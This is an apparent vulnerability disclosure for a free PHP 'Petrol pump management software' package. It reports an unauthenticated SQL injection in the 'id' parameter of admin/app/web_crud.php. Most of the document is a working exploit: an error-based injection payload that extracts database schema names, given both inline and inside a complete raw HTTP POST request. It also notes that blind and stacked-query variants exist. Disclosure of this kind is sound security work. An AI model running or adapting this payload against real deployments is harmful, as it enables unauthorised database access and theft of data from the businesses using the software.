# Petrol pump management software free download - SQL injection vulnerability

### You do not need to log in to the website to remotely trigger SQL injection vulnerabilities!

Supplier:https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html

http://localhost/admin/app/web_crud.php   -----> POST ----->  'id' can control some id parameters

Payload:update3=yes&encryption=1&host=1&port=1&username=1&password=2&email=1&id=1' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(0x01,(SELECT MID((IFNULL(CAST(schema_name AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 6,1),0x00,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- 

```r
POST /admin/app/web_crud.php HTTP/1.1
Host: xxxxxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=atk3ii6u9he5ppvnhatlt59e92
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 298

update3=yes&encryption=1&host=1&port=1&username=1&password=2&email=1&id=1' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(0x01,(SELECT MID((IFNULL(CAST(schema_name AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 6,1),0x00,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- 
```

![1](/img/8.png)

Running this payload will reveal the name of the database. This indicates that SQL injection vulnerability has been successfully executed in the database, allowing for database querying. Apart from error-based injection, there also exists time-based blind injection, boolean-based blind injection, and stacked query injection vulnerabilities.

![2](/img/10.png)

The parameter "id" received on line 225 of the web_crud.php file in the "admin/app" directory of the website is vulnerable to being controlled by guest users, and then it is executed on line 227, causing a SQL injection vulnerability.

web_crud.php
![2](/img/9.png)
